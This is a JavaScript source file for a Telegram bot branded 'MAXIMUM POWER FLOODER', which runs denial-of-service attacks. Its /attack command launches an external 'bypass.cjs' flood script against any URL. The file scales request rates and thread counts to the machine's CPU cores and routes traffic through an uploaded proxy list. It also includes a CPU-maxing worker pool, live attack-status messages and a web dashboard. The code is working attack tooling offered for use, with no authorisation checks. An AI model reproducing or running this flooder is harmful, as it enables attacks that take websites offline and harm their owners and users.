import { Telegraf } from 'telegraf';
import { spawn } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import os from 'os';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config();

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN not found!');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';

// ========== CPU MAXIMIZER ==========
class CPUMaximizer {
    constructor() {
        this.cpuCount = os.cpus().length;
        this.workers = [];
        this.isActive = false;
        this.usage = [];
    }

    start() {
        if (this.isActive) return;
        this.isActive = true;
        
        console.log(`🔥 Activating ${this.cpuCount} CPU cores at 100%...`);
        
        // Create CPU workers for each core
        for (let i = 0; i < this.cpuCount * 2; i++) {
            this.createWorker(i);
        }
        
        // Monitor CPU
        setInterval(() => this.monitor(), 3000);
    }

    createWorker(id) {
        const worker = setInterval(() => {
            if (!this.isActive) {
                clearInterval(worker);
                return;
            }
            
            // Heavy CPU calculations
            for (let j = 0; j < 1000000; j++) {
                Math.sqrt(j) * Math.sin(j) * Math.cos(j) * Math.tan(j);
                Math.pow(j, 1.5) * Math.log(j + 1);
                crypto.randomBytes(1000);
            }
        }, 5);
        
        this.workers.push(worker);
    }

    monitor() {
        const loadAvg = os.loadavg();
        const percentage = (loadAvg[0] / this.cpuCount) * 100;
        this.usage.push(percentage);
        
        if (this.usage.length > 10) this.usage.shift();
        
        const avg = this.usage.reduce((a, b) => a + b, 0) / this.usage.length;
        
        // If CPU is low, add more workers
        if (avg < 70 && this.workers.length < this.cpuCount * 4) {
            this.createWorker(this.workers.length);
        }
        
        console.log(`📊 CPU: ${avg.toFixed(1)}% | Cores: ${this.cpuCount} | Workers: ${this.workers.length}`);
    }

    stop() {
        this.isActive = false;
        this.workers.forEach(w => clearInterval(w));
        this.workers = [];
    }
}

const cpuMaximizer = new CPUMaximizer();

// ========== ATTACK MANAGER ==========
class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.proxies = [];
        this.loadProxies();
    }

    loadProxies() {
        if (fs.existsSync('proxy.txt')) {
            this.proxies = fs.readFileSync('proxy.txt', 'utf-8')
                .split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
        }
        console.log(`📥 Loaded ${this.proxies.length} proxies`);
    }

    async startAttack(url, ctx) {
        const attackId = Date.now().toString();
        
        // Calculate max resources
        const cpuCores = os.cpus().length;
        const totalMemory = Math.floor(os.totalmem() / 1024 / 1024); // MB
        const maxThreads = cpuCores * 100; // 100 threads per core
        const maxRate = cpuCores * 50000; // 50k RPS per core
        
        // Start CPU maximizer
        cpuMaximizer.start();
        
        // Send status message
        const statusMsg = await ctx.reply(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 MAXIMUM POWER ATTACK INITIALIZED                          ║
╠══════════════════════════════════════════════════════════════╣
║  Target: ${url.substring(0, 50)}...                         ║
╠══════════════════════════════════════════════════════════════╣
║  🔥 RESOURCES                                                ║
║  CPU Cores: ${cpuCores}                                         ║
║  Threads: ${maxThreads}                                         ║
║  Rate: ${maxRate.toLocaleString()} RPS                        ║
║  Memory: ${totalMemory}MB                                      ║
║  Proxies: ${this.proxies.length}                               ║
╠══════════════════════════════════════════════════════════════╣
║  ⚡ Attack ID: ${attackId.slice(0, 8)}...                     ║
║  🔄 Status: RUNNING                                           ║
╚══════════════════════════════════════════════════════════════╝
        `);

        // Check if bypass.cjs exists
        if (!fs.existsSync('bypass.cjs')) {
            await ctx.reply('❌ bypass.cjs not found!');
            return;
        }

        // Launch attack with maximum settings
        const attack = spawn('node', [
            'bypass.cjs',
            url,
            '300', // 5 minutes default
            maxRate.toString(),
            maxThreads.toString(),
            'proxy.txt',
            '--all', // Enable all features
            '--type', 'http'
        ]);

        this.attacks.set(attackId, {
            process: attack,
            url,
            startTime: Date.now(),
            ctx,
            statusMsgId: statusMsg.message_id,
            chatId: ctx.chat.id,
            requests: 0
        });

        // Monitor output
        attack.stdout.on('data', (data) => {
            const output = data.toString();
            
            // Update stats every 5 seconds
            if (output.includes('Requests:')) {
                const match = output.match(/Requests: (\d+)/);
                if (match) {
                    const attack = this.attacks.get(attackId);
                    if (attack) {
                        attack.requests = parseInt(match[1]);
                        
                        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                        const rps = Math.floor(attack.requests / Math.max(1, elapsed));
                        
                        ctx.telegram.editMessageText(
                            attack.chatId,
                            attack.statusMsgId,
                            null,
                            `
╔══════════════════════════════════════════════════════════════╗
║  🚀 MAXIMUM POWER ATTACK - RUNNING                            ║
╠══════════════════════════════════════════════════════════════╣
║  Target: ${url.substring(0, 40)}...                         ║
╠══════════════════════════════════════════════════════════════╣
║  📊 STATISTICS                                               ║
║  Total Requests: ${attack.requests.toLocaleString()}                         ║
║  Current RPS: ${rps.toLocaleString()}                                       ║
║  CPU Usage: ${(os.loadavg()[0] / os.cpus().length * 100).toFixed(1)}%                       ║
║  Elapsed: ${elapsed}s / 300s                                  ║
║  Workers: ${cpuMaximizer.workers.length}                                     ║
╚══════════════════════════════════════════════════════════════╝
                            `
                        ).catch(() => {});
                    }
                }
            }
        });

        attack.on('close', (code) => {
            const attack = this.attacks.get(attackId);
            if (attack) {
                const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                
                ctx.telegram.editMessageText(
                    attack.chatId,
                    attack.statusMsgId,
                    null,
                    `
╔══════════════════════════════════════════════════════════════╗
║  ✅ ATTACK COMPLETED                                          ║
╠══════════════════════════════════════════════════════════════╣
║  Target: ${url.substring(0, 40)}...                         ║
║  Duration: ${elapsed}s                                        ║
║  Total Requests: ${attack.requests.toLocaleString()}                         ║
║  Exit Code: ${code}                                           ║
╚══════════════════════════════════════════════════════════════╝
                    `
                ).catch(() => {});
                
                this.attacks.delete(attackId);
            }
            
            // Stop CPU maximizer if no attacks running
            if (this.attacks.size === 0) {
                cpuMaximizer.stop();
            }
        });
    }
}

const attackManager = new AttackManager();

// ========== BOT COMMANDS ==========

// Start command
bot.start((ctx) => {
    ctx.reply(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 MAXIMUM POWER FLOODER                                     ║
╠══════════════════════════════════════════════════════════════╣
║  Commands:                                                    ║
║  /attack <url> - Launch maximum power attack                 ║
║  /stop - Stop current attack                                 ║
║  /status - Show system status                                ║
║  /cpu - Show CPU usage                                       ║
╚══════════════════════════════════════════════════════════════╝
    `);
});

// ATTACK COMMAND - ONE COMMAND FOR MAX POWER
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const url = args[1];
    
    if (!url) {
        return ctx.reply('❌ Usage: /attack <url>\nExample: /attack https://example.com');
    }
    
    try {
        new URL(url); // Validate URL
    } catch {
        return ctx.reply('❌ Invalid URL');
    }
    
    if (attackManager.attacks.size > 0) {
        return ctx.reply('⚠️ An attack is already running. Use /stop first or wait.');
    }
    
    await attackManager.startAttack(url, ctx);
});

// Stop command
bot.command('stop', (ctx) => {
    if (attackManager.attacks.size === 0) {
        return ctx.reply('❌ No attack running');
    }
    
    for (const [id, attack] of attackManager.attacks) {
        attack.process.kill('SIGINT');
    }
    
    cpuMaximizer.stop();
    ctx.reply('🛑 Attack stopped');
});

// Status command
bot.command('status', (ctx) => {
    const cpuCores = os.cpus().length;
    const loadAvg = os.loadavg();
    const cpuPercent = (loadAvg[0] / cpuCores) * 100;
    const memory = Math.floor(os.totalmem() / 1024 / 1024 / 1024);
    const freeMem = Math.floor(os.freemem() / 1024 / 1024 / 1024);
    
    ctx.reply(`
📊 *SYSTEM STATUS*

🖥️ *CPU*
Cores: ${cpuCores}
Usage: ${cpuPercent.toFixed(1)}%
Load: ${loadAvg[0].toFixed(2)}

💾 *Memory*
Total: ${memory}GB
Free: ${freeMem}GB

🎯 *Attack*
Active: ${attackManager.attacks.size > 0 ? '✅ YES' : '❌ NO'}
Workers: ${cpuMaximizer.workers.length}
Proxies: ${attackManager.proxies.length}

⚡ *Commands*
/attack <url> - Start max attack
/stop - Stop attack
    `, { parse_mode: 'Markdown' });
});

// CPU command
bot.command('cpu', (ctx) => {
    const cpus = os.cpus();
    const loadAvg = os.loadavg();
    
    let cpuInfo = '🖥️ *CPU STATUS*\n\n';
    cpus.forEach((cpu, i) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
        const idle = cpu.times.idle;
        const usage = ((total - idle) / total * 100).toFixed(1);
        cpuInfo += `Core ${i}: ${usage}%\n`;
    });
    
    cpuInfo += `\n📊 Load Average: ${loadAvg.map(l => l.toFixed(2)).join(', ')}`;
    cpuInfo += `\n🧵 Workers: ${cpuMaximizer.workers.length}`;
    
    ctx.reply(cpuInfo, { parse_mode: 'Markdown' });
});

// File upload for proxies
bot.on('document', async (ctx) => {
    if (ctx.message.document.file_name === 'proxy.txt') {
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            fs.writeFileSync('proxy.txt', content);
            attackManager.loadProxies();
            
            ctx.reply(`✅ Loaded ${attackManager.proxies.length} proxies`);
        } catch (err) {
            ctx.reply('❌ Failed to load proxies');
        }
    }
});

// ========== WEB SERVER ==========
const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    const cpuCores = os.cpus().length;
    const loadAvg = os.loadavg();
    const cpuPercent = (loadAvg[0] / cpuCores) * 100;
    
    res.send(`
        <html>
        <head>
            <title>🚀 MAX POWER FLOODER</title>
            <style>
                body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                .stat { border: 1px solid #00ff00; padding: 10px; margin: 10px 0; }
                .value { font-size: 24px; color: #00ff00; }
                .bar { height: 20px; background: #333; margin: 5px 0; }
                .fill { height: 100%; background: #00ff00; width: ${cpuPercent}%; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 MAXIMUM POWER FLOODER</h1>
                
                <div class="stat">
                    <h3>CPU USAGE</h3>
                    <div class="bar"><div class="fill"></div></div>
                    <div class="value">${cpuPercent.toFixed(1)}%</div>
                </div>
                
                <div class="stat">
                    <h3>SYSTEM</h3>
                    <div>Cores: ${cpuCores}</div>
                    <div>Workers: ${cpuMaximizer.workers.length}</div>
                    <div>Attack Active: ${attackManager.attacks.size > 0 ? 'YES' : 'NO'}</div>
                    <div>Proxies: ${attackManager.proxies.length}</div>
                </div>
                
                <div class="stat">
                    <h3>COMMANDS</h3>
                    <div>/attack https://target.com</div>
                    <div>/stop</div>
                    <div>/status</div>
                    <div>/cpu</div>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.listen(port, '::', () => {
    console.log(`🌐 Web monitor: http://localhost:${port}`);
});

// ========== START BOT ==========
console.log(`
╔══════════════════════════════════════════════════════════════╗
║  🚀 MAXIMUM POWER FLOODER v1.0                                ║
╠══════════════════════════════════════════════════════════════╣
║  CPU Cores: ${os.cpus().length}                                              ║
║  Memory: ${Math.floor(os.totalmem() / 1024 / 1024 / 1024)}GB                                            ║
╠══════════════════════════════════════════════════════════════╣
║  Commands:                                                    ║
║  /attack <url> - ONE COMMAND MAX POWER                       ║
║  /stop - Stop attack                                         ║
║  /status - System status                                     ║
╚══════════════════════════════════════════════════════════════╝
`);

bot.launch()
    .then(() => console.log('✅ Bot is online!'))
    .catch(err => console.error('❌ Failed:', err));

process.once('SIGINT', () => {
    cpuMaximizer.stop();
    attackManager.attacks.forEach(a => a.process.kill());
    bot.stop('SIGINT');
});
